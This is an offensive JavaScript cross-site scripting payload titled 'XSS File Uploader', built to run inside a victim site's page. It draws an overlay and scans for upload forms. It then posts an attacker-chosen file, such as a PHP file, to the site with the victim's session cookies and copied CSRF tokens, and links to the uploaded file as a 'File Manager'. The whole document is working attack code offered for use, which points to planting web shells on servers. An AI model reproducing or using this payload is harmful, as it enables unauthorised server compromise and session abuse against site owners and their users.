document.write(`
<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
background:#1e1e1e;border:3px solid #00ff00;padding:20px;z-index:999999;
width:500px;font-family:monospace;color:#00ff00;box-shadow:0 0 20px #000;">
    
    <h3>📁 XSS File Uploader</h3>
    
    <!-- Step 1: Scan for upload endpoint -->
    <button onclick="scanForms()" style="background:#00ff00;color:#000;padding:8px;margin:5px">🔍 Scan Forms</button>
    <div id="scanResult" style="background:#000;padding:5px;margin:5px;font-size:12px;">Ready</div>
    
    <!-- Step 2: Upload URL and field name -->
    <input id="uploadUrl" placeholder="Upload URL" value="/upload.php" style="width:100%;margin:5px 0;padding:5px;">
    <input id="fieldName" placeholder="Field name" value="file" style="width:100%;margin:5px 0;padding:5px;">
    
    <!-- Step 3: SELECT FILE FROM YOUR LAPTOP - THIS IS WHAT YOU NEED -->
    <div style="border:1px solid #00ff00;padding:10px;margin:10px 0;">
        <strong>📂 Select file from your laptop:</strong>
        <input type="file" id="localFile" style="margin:10px 0;color:#00ff00;">
        <div id="fileInfo" style="font-size:12px;"></div>
    </div>
    
    <!-- Step 4: Upload button -->
    <button onclick="uploadLocalFile()" style="background:#00ff00;color:#000;padding:10px;width:100%;font-weight:bold;">🚀 Upload Selected File</button>
    
    <!-- Status -->
    <div id="status" style="background:#000;padding:10px;margin-top:10px;max-height:150px;overflow:auto;">Ready</div>
</div>
`);

// File selection preview
document.getElementById('localFile').addEventListener('change', function(e) {
    const file = e.target.files[0];
    if(file) {
        document.getElementById('fileInfo').innerHTML = 
            `Selected: ${file.name} (${(file.size/1024).toFixed(2)} KB)`;
    }
});

// Scan for upload forms
window.scanForms = function() {
    let results = 'Scanning...<br>';
    document.querySelectorAll('form').forEach(f => {
        const fileInput = f.querySelector('input[type="file"]');
        if(fileInput) {
            results += `✅ Found: ${f.action || 'same page'} (field: ${fileInput.name})<br>`;
        }
    });
    document.getElementById('scanResult').innerHTML = results;
};

// Upload the selected file
window.uploadLocalFile = async function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const status = document.getElementById('status');
    status.innerHTML = `Uploading ${fileInput.files[0].name}...<br>`;
    
    const formData = new FormData();
    formData.append(fieldName, fileInput.files[0]); // THE KEY PART - appending selected file
    
    // Add any CSRF tokens from existing forms
    const existingForm = document.querySelector('form');
    if(existingForm) {
        existingForm.querySelectorAll('input[type="hidden"]').forEach(input => {
            if(input.name) formData.append(input.name, input.value);
        });
    }
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData,
            credentials: 'include'
        });
        
        if(response.ok) {
            const text = await response.text();
            status.innerHTML += '✅ Upload successful!<br>';
            // Try to find file URL in response
            const match = text.match(/(https?:\/\/[^\s"']+\.(php|html|gif|jpg))/i);
            if(match) {
                status.innerHTML += `📁 File URL: ${match[0]}<br>`;
                status.innerHTML += `<a href="${match[0]}" target="_blank" style="color:#00ff00;">Open File Manager</a><br>`;
            } else {
                status.innerHTML += `Response: ${text.substring(0, 200)}...<br>`;
            }
        } else {
            status.innerHTML += `❌ Upload failed: ${response.status}<br>`;
        }
    } catch(e) {
        status.innerHTML += `❌ Error: ${e.message}<br>`;
    }
};
